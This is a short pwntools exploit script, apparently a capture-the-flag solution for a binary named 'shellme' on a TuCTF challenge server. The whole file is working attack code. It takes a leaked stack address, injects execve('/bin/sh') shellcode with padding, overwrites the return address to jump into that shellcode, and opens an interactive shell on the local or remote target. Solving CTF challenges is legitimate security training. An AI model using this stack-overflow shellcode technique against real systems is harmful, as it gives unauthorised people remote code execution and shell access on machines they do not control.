from pwn import *

e = ELF("./shellme")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chal.tuctf.com", 30507)
else:
  p = process(e.path)

p.recvuntil("0x")
leak = int(p.recvline(), 16)

pay = (("/bin/sh\x00" + asm("""
  mov rdi, """ + hex(leak) + """
  xor rsi, rsi
  xor rdx, rdx
  push SYS_execve
  pop rax
  syscall
""")).ljust(40) + p64(leak + 8))

print(len(pay))
p.sendlineafter(">", pay)

p.interactive()
